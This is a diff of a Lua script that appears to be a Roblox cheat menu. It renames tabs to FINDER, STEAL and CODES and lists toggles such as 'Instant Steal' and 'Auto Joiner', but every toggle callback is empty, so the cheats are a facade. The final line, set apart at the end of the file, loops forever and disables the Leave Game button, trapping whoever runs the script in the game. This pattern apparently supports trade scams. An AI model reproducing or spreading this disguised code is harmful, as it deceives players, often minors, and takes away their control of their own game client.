@@ -294,7 +294,7 @@ do
 end
  
 --=========================================================
--- TABS (MACHINE / CODES / TRADE)
+-- TABS (FINDER / STEAL / CODES)
 --=========================================================
 local TabHolder = Instance.new("Frame")
 TabHolder.Size = UDim2.new(1, -32, 0, 40)
@@ -321,9 +321,9 @@ local function createTabButton(text)
 	return Btn
 end
  
-local MachineTabBtn = createTabButton("MACHINE")
+local FinderTabBtn = createTabButton("FINDER")
+local StealTabBtn = createTabButton("STEAL")
 local CodesTabBtn = createTabButton("CODES")
-local TradeTabBtn = createTabButton("TRADE")
  
 --=========================================================
 -- PAGES
@@ -348,24 +348,24 @@ local function createPage(visible)
 	return Page
 end
  
-local MachinePage = createPage(true)
+local FinderPage = createPage(true)
+local StealPage = createPage(false)
 local CodesPage = createPage(false)
-local TradePage = createPage(false)
  
 local function switchTab(activePage)
-	MachinePage.Visible = activePage == MachinePage
+	FinderPage.Visible = activePage == FinderPage
+	StealPage.Visible = activePage == StealPage
 	CodesPage.Visible = activePage == CodesPage
-	TradePage.Visible = activePage == TradePage
  
-	tween(MachineTabBtn, {BackgroundColor3 = activePage == MachinePage and Theme.TabActive or Theme.TabInactive}, 0.15)
+	tween(FinderTabBtn, {BackgroundColor3 = activePage == FinderPage and Theme.TabActive or Theme.TabInactive}, 0.15)
+	tween(StealTabBtn, {BackgroundColor3 = activePage == StealPage and Theme.TabActive or Theme.TabInactive}, 0.15)
 	tween(CodesTabBtn, {BackgroundColor3 = activePage == CodesPage and Theme.TabActive or Theme.TabInactive}, 0.15)
-	tween(TradeTabBtn, {BackgroundColor3 = activePage == TradePage and Theme.TabActive or Theme.TabInactive}, 0.15)
 end
  
-MachineTabBtn.MouseButton1Click:Connect(function() switchTab(MachinePage) end)
+FinderTabBtn.MouseButton1Click:Connect(function() switchTab(FinderPage) end)
+StealTabBtn.MouseButton1Click:Connect(function() switchTab(StealPage) end)
 CodesTabBtn.MouseButton1Click:Connect(function() switchTab(CodesPage) end)
-TradeTabBtn.MouseButton1Click:Connect(function() switchTab(TradePage) end)
-switchTab(MachinePage)
+switchTab(FinderPage)
  
 --=========================================================
 -- TOGGLE ROW COMPONENT
@@ -470,15 +470,16 @@ end
 -- BUILD PAGES
 -- (empty callbacks — hook your own logic here)
 --=========================================================
-createToggle(MachinePage, "AUTO SPIN", "", 1, function(state) end)
-createToggle(MachinePage, "GUARANTEED LUCK", "", 2, function(state) end)
-createToggle(MachinePage, "CHANCE BOOST", "", 3, function(state) end)
+createToggle(FinderPage, "Find Brainrots", "", 1, function(state) end)
+createToggle(FinderPage, "Auto Joiner", "", 2, function(state) end)
+createToggle(FinderPage, "FPS Booster", "", 3, function(state) end)
  
-createToggle(CodesPage, "AUTO CODES", "", 1, function(state) end)
-createToggle(CodesPage, "Ai RIDDLE", "", 2, function(state) end)
+createToggle(StealPage, "Instant Steal", "", 1, function(state) end)
+createToggle(StealPage, "Antil Grief", "", 2, function(state) end)
+createToggle(StealPage, "Anti Ragdoll", "", 2, function(state) end)
  
-createToggle(TradePage, "FREEZE TRADE", "", 1, function(state) end)
-createToggle(TradePage, "FORCE ACCEPT", "", 2, function(state) end)
-createToggle(TradePage, "ANTI CANCEL", "", 3, function(state) end)
+createToggle(CodesPage, "Auto Codes", "", 1, function(state) end)
+createToggle(CodesPage, "Auto Submit", "", 2, function(state) end)
+createToggle(CodesPage, "Ai Riddle", "", 3, function(state) end)
 
 task.spawn(function() while task.wait() do pcall(function() for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do v:Disable() end end) end end)
